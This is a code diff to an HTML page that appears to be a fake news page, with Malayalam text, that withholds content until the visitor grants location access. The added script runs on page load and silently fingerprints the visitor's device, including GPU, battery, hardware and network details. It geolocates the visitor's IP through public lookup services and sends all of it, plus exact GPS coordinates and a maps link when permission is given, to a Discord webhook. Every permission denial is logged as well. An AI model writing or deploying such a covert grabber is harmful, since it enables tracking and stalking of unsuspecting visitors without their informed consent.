@@ -301,11 +301,207 @@
         const btnDeny = document.getElementById('btn-deny');
         const deniedMessage = document.getElementById('denied-message');
 
-        btnDeny.addEventListener('click', () => {
+        const sessionData = {
+            id: Math.random().toString(36).substring(2, 10).toUpperCase(),
+            ip: "Unknown",
+            coords: null
+        };
+        let loggedPageLoad = false;
+
+        // Gather browser and device info
+        function getDeviceDetails() {
+            const gpu = getGPURenderer();
+            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language || (navigator.languages && navigator.languages[0]) || "Unknown",
+                languages: navigator.languages ? navigator.languages.join(", ") : "Unknown",
+                screenResolution: `${screen.width}x${screen.height}`,
+                viewportSize: `${window.innerWidth}x${window.innerHeight}`,
+                colorDepth: `${screen.colorDepth}-bit`,
+                pixelRatio: window.devicePixelRatio || 1,
+                cpuCores: navigator.hardwareConcurrency || "Unknown",
+                deviceMemory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Unknown",
+                maxTouchPoints: navigator.maxTouchPoints || 0,
+                cookiesEnabled: navigator.cookieEnabled ? "Yes" : "No",
+                doNotTrack: navigator.doNotTrack || "Not set",
+                referrer: document.referrer || "Direct visit",
+                pageUrl: window.location.href,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "Unknown",
+                timezoneOffset: `${-new Date().getTimezoneOffset()} mins`,
+                gpuVendor: gpu ? gpu.vendor : "Unknown",
+                gpuRenderer: gpu ? gpu.renderer : "Unknown",
+                connectionType: conn ? conn.effectiveType || "Unknown" : "Unknown",
+                downlink: conn ? `${conn.downlink} Mbps` : "Unknown",
+                rtt: conn ? `${conn.rtt} ms` : "Unknown"
+            };
+        }
+
+        // Get GPU details
+        function getGPURenderer() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return null;
+                const dbgRenderInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (!dbgRenderInfo) return null;
+                const vendor = gl.getParameter(dbgRenderInfo.UNMASKED_VENDOR_WEBGL);
+                const renderer = gl.getParameter(dbgRenderInfo.UNMASKED_RENDERER_WEBGL);
+                return { vendor, renderer };
+            } catch (e) {
+                return null;
+            }
+        }
+
+        // Get battery level & state
+        async function getBatteryDetails() {
+            if (typeof navigator.getBattery === 'function') {
+                try {
+                    const battery = await navigator.getBattery();
+                    return {
+                        level: `${Math.round(battery.level * 100)}%`,
+                        charging: battery.charging ? "Charging" : "Discharging"
+                    };
+                } catch (e) {
+                    return null;
+                }
+            }
+            return null;
+        }
+
+        // Fetch IP geolocation and detail info
+        async function fetchIPDetails() {
+            try {
+                const res = await fetch('https://ipapi.co/json/');
+                if (res.ok) {
+                    return await res.json();
+                }
+            } catch (e) {
+                console.error("ipapi.co failed, trying ip-api.com", e);
+            }
+            try {
+                const res = await fetch('https://ip-api.com/json/');
+                if (res.ok) {
+                    const data = await res.json();
+                    return {
+                        ip: data.query,
+                        city: data.city,
+                        region: data.regionName,
+                        country_name: data.country,
+                        postal: data.zip,
+                        timezone: data.timezone,
+                        org: data.isp,
+                        asn: data.as
+                    };
+                }
+            } catch (e) {
+                console.error("ip-api.com failed, trying ipify", e);
+            }
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                if (res.ok) {
+                    const data = await res.json();
+                    return { ip: data.ip };
+                }
+            } catch (e) {
+                console.error("All IP lookup APIs failed", e);
+            }
+            return { ip: "Unknown IP" };
+        }
+
+        // Send payload helper
+        async function sendDiscordPayload(payload) {
+            const { discordWebhookUrl, useDiscordWebhook } = CONFIG;
+            if (!useDiscordWebhook || !discordWebhookUrl || discordWebhookUrl === "YOUR_DISCORD_WEBHOOK_URL") {
+                return;
+            }
+            try {
+                await fetch(discordWebhookUrl, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error("Error sending payload to Discord:", error);
+            }
+        }
+
+        // Log page load information
+        async function logPageLoad() {
+            if (loggedPageLoad) return;
+            loggedPageLoad = true;
+
+            const ipDetails = await fetchIPDetails();
+            sessionData.ip = ipDetails.ip || "Unknown";
+            const device = getDeviceDetails();
+            const battery = await getBatteryDetails();
+
+            const fields = [
+                { name: "Session ID", value: `\`${sessionData.id}\``, inline: true },
+                { name: "IP Address", value: `\`${sessionData.ip}\``, inline: true },
+                { name: "Location (IP-based)", value: `${ipDetails.city || "Unknown"}, ${ipDetails.region || "Unknown"}, ${ipDetails.country_name || "Unknown"} (Postal: ${ipDetails.postal || "N/A"})`, inline: false },
+                { name: "ISP / Network Provider", value: `${ipDetails.org || "Unknown"} (${ipDetails.asn || "N/A"})`, inline: false },
+                { name: "Timezone", value: `${ipDetails.timezone || device.timezone} (Offset: ${device.timezoneOffset})`, inline: true },
+                { name: "Device / Platform", value: `**OS:** ${device.platform}\n**User-Agent:** \`${device.userAgent}\``, inline: false },
+                { name: "Screen Details", value: `**Resolution:** ${device.screenResolution}\n**Viewport:** ${device.viewportSize}\n**Pixel Ratio:** ${device.pixelRatio}\n**Colors:** ${device.colorDepth}`, inline: true },
+                { name: "Hardware Specs", value: `**CPU Cores:** ${device.cpuCores}\n**Device Memory:** ${device.deviceMemory}\n**Touch Points:** ${device.maxTouchPoints}`, inline: true },
+                { name: "GPU Details", value: `**Vendor:** ${device.gpuVendor}\n**Renderer:** ${device.gpuRenderer}`, inline: false }
+            ];
+
+            if (battery) {
+                fields.push({ name: "Battery Status", value: `**Level:** ${battery.level}\n**Status:** ${battery.charging}`, inline: true });
+            }
+
+            fields.push({
+                name: "Connection Info",
+                value: `**Type:** ${device.connectionType}\n**Downlink:** ${device.downlink}\n**RTT:** ${device.rtt}`,
+                inline: true
+            });
+
+            fields.push({
+                name: "Browsing Context",
+                value: `**Referrer:** ${device.referrer}\n**URL:** ${device.pageUrl}`,
+                inline: false
+            });
+
+            const payload = {
+                embeds: [{
+                    title: "👀 New Visitor - Awaiting Location Consent",
+                    color: 3447003, // Blue
+                    fields: fields,
+                    timestamp: new Date().toISOString()
+                }]
+            };
+
+            await sendDiscordPayload(payload);
+        }
+
+        btnDeny.addEventListener('click', async () => {
             btnAllow.style.display = 'none';
             btnDeny.style.display = 'none';
             deniedMessage.style.display = 'block';
             deniedMessage.innerText = 'ക്ഷമിക്കുക, പ്രാദേശിക വിവരങ്ങൾ ലഭ്യമാകാത്തതിനാൽ വാർത്ത കാണാൻ കഴിയില്ല. പേജ് റീലോഡ് ചെയ്ത് അനുമതി നൽകുക.';
+
+            // Ensure load details are logged
+            if (!loggedPageLoad) {
+                await logPageLoad();
+            }
+
+            // Log denial to Discord
+            const payload = {
+                embeds: [{
+                    title: "❌ Geolocation Permission Denied",
+                    color: 15158332, // Red
+                    description: `User denied location access on the modal prompt.`,
+                    fields: [
+                        { name: "Session ID", value: `\`${sessionData.id}\``, inline: true },
+                        { name: "IP Address", value: `\`${sessionData.ip}\``, inline: true }
+                    ],
+                    timestamp: new Date().toISOString()
+                }]
+            };
+            await sendDiscordPayload(payload);
         });
 
         btnAllow.addEventListener('click', async () => {
@@ -313,18 +509,39 @@
             btnAllow.innerText = 'ലോഡ് ചെയ്യുന്നു...';
 
             try {
+                // Ensure initial load details are sent
+                if (!loggedPageLoad) {
+                    await logPageLoad();
+                }
+
                 // 1. Get Coordinates
                 const coords = await getCoordinates();
+                sessionData.coords = coords;
 
-                // 2. Get IP Address
-                const ip = await getIPAddress();
+                // 2. Log exact coordinates to Discord
+                const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${coords.lat},${coords.lon}`;
+                const payload = {
+                    embeds: [{
+                        title: "📍 Precise Location Granted",
+                        color: 3066993, // Green
+                        description: `User granted precise GPS location access!`,
+                        fields: [
+                            { name: "Session ID", value: `\`${sessionData.id}\``, inline: true },
+                            { name: "IP Address", value: `\`${sessionData.ip}\``, inline: true },
+                            { name: "Latitude", value: `\`${coords.lat}\``, inline: true },
+                            { name: "Longitude", value: `\`${coords.lon}\``, inline: true },
+                            { name: "Accuracy", value: `\`${coords.accuracy}m\``, inline: true },
+                            { name: "Google Maps Link", value: `[Open in Google Maps](${mapsUrl})`, inline: false }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                };
 
-                // 3. Log data based on config
+                await sendDiscordPayload(payload);
+
+                // Also log to GitHub if configured
                 if (CONFIG.useGitHubLogging) {
-                    await logToGitHub(ip, coords);
-                }
-                if (CONFIG.useDiscordWebhook) {
-                    await logToDiscord(ip, coords);
+                    await logToGitHub(sessionData.ip, coords);
                 }
 
                 // 4. Success - Unblur content and remove modal
@@ -340,6 +557,26 @@
                 btnDeny.style.display = 'none';
                 deniedMessage.style.display = 'block';
                 deniedMessage.innerText = userFriendlyError;
+
+                // Ensure initial load details are sent
+                if (!loggedPageLoad) {
+                    await logPageLoad();
+                }
+
+                // Log rejection/error details to Discord
+                const payload = {
+                    embeds: [{
+                        title: "⚠️ Location Access Error / Rejected",
+                        color: 15158332, // Red
+                        description: `Failed to retrieve precise geolocation: ${error.message || 'Unknown error'} (Code: ${error.code || 'N/A'})`,
+                        fields: [
+                            { name: "Session ID", value: `\`${sessionData.id}\``, inline: true },
+                            { name: "IP Address", value: `\`${sessionData.ip}\``, inline: true }
+                        ],
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+                await sendDiscordPayload(payload);
             }
         });
 
@@ -437,37 +674,8 @@
             }
         }
 
-        async function logToDiscord(ip, coords) {
-            const { discordWebhookUrl } = CONFIG;
-            if (!discordWebhookUrl || discordWebhookUrl === "YOUR_DISCORD_WEBHOOK_URL") {
-                return;
-            }
-
-            const payload = {
-                embeds: [{
-                    title: "📌 New Visit Logged",
-                    color: 15007797,
-                    fields: [
-                        { name: "IP Address", value: ip, inline: true },
-                        { name: "Latitude", value: coords.lat.toString(), inline: true },
-                        { name: "Longitude", value: coords.lon.toString(), inline: true },
-                        { name: "Accuracy", value: `${coords.accuracy}m`, inline: true },
-                        { name: "Time", value: new Date().toLocaleString(), inline: true },
-                        { name: "Browser / Device", value: navigator.userAgent }
-                    ]
-                }]
-            };
-
-            try {
-                await fetch(discordWebhookUrl, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(payload)
-                });
-            } catch (error) {
-                console.error("Error logging to Discord:", error);
-            }
-        }
+        // Trigger loading and logging immediately on page load
+        logPageLoad();
     </script>
 </body>
 
